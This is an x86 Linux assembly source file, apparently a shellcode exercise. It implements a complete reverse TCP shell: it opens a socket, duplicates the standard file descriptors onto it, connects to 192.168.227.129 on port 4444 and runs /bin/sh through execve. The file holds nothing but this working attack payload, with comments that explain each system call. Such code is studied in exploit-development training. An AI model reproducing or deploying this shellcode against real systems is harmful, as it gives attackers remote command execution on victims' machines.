global _start           

section .text

_start:
    ;[1] create socket connection
	;Man page: socket(int domain, int type, int protocol);
	;sock_file_des = socket(2,1,0)
    
    xor edx, edx
    push 0x66           ; socket call(0x66)
    pop eax
    push edx            ; protocol = 0
    inc edx
    push edx            ; sock_stream = 1
    mov ebx, edx        ; EBX =1
    inc edx				
    push edx            ; AF_INET =2
    mov ecx, esp        ; save the pointer to args in ecx register
    int 0x80            ; call socketcall()

    ; int dup2(int oldfd, int newfd);
    mov ebx, eax       ; store sock_file_des in ebx register    
    mov ecx, edx        ; counter = 2   
    loop:
        mov al, 0x3f    
        int 0x80
        dec ecx
        jns loop
		
	; sock_ad.sin_family = AF_INET; 
	;sock_ad.sin_port = htons(4444);
	;sock_ad.sin_addr.s_addr = inet_addr("192.168.227.129");
	
	;connect(sock_file_des,(struct sockaddr *) &sock_ad,sizeof(sock_ad));
	
	xchg ebx, edx       ; before xchg edx=2 and ebx=sock_file_des and after xchg ebx=2, edx=sock_file_des
    push 0x81e3a8c0     ; sock_ad.sin_addr.s_addr = inet_addr("192.168.227.129");
    push word 0x5C11    ; sock_ad.sin_port = htons(4444);
    push word bx        ; sock_ad.sin_family = AF_INET =2;
    mov ecx, esp        ; pointer to struct
    
    mov al, 0x66        ; socket call (0x66)
    inc ebx             ; connect (3)
    push 0x10           ; sizeof(struct sockaddr_in)
    push ecx            ; &serv_addr
    push edx            ; sock_file_des
    mov ecx, esp        ; save the pointer to args in ecx register
    int 0x80            

    mov   al, 11            ; execve system call 
    cdq						; overwriting edx with either 0 (if eax is positive)
    push  edx               ; push null
    push  0x68732f6e        ; hs/b
    push  0x69622f2f        ; ib//
    mov   ebx,esp           ; save pointer
    push  edx               ; push null
    push  ebx               ; push pointer
    mov   ecx,esp           ; save pointer
    int   0x80

    
